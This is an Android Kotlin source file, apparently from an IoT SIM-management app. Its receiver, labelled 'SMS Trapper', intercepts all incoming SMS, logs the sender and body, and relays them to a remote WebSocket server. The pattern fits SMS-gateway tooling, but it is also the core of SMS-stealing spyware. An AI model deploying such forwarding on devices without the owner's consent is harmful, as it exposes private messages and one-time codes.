package com.iot.simmanager.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.google.gson.Gson
import com.iot.simmanager.data.remote.WebSocketClient
import com.iot.simmanager.utils.AppLogger
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class SmsReceiver : BroadcastReceiver() {

    @Inject lateinit var webSocketClient: WebSocketClient
    @Inject lateinit var gson: Gson
    @Inject lateinit var logger: AppLogger

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (sms in messages) {
                val sender = sms.originatingAddress ?: "Unknown"
                val body = sms.messageBody ?: ""

                logger.d("SMS Trapper", "Intercepted SMS from $sender: $body")

                val payload = mapOf(
                    "type" to "DEVICE_SMS",
                    "sender" to sender,
                    "body" to body,
                    "timestamp" to System.currentTimeMillis()
                )

                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        if (webSocketClient.connectionState.value) {
                            webSocketClient.sendPayload(gson.toJson(payload))
                        }
                    } catch (e: Exception) {
                        logger.e("SMS Trapper", "Failed to forward SMS", e)
                    }
                }
            }
        }
    }
}
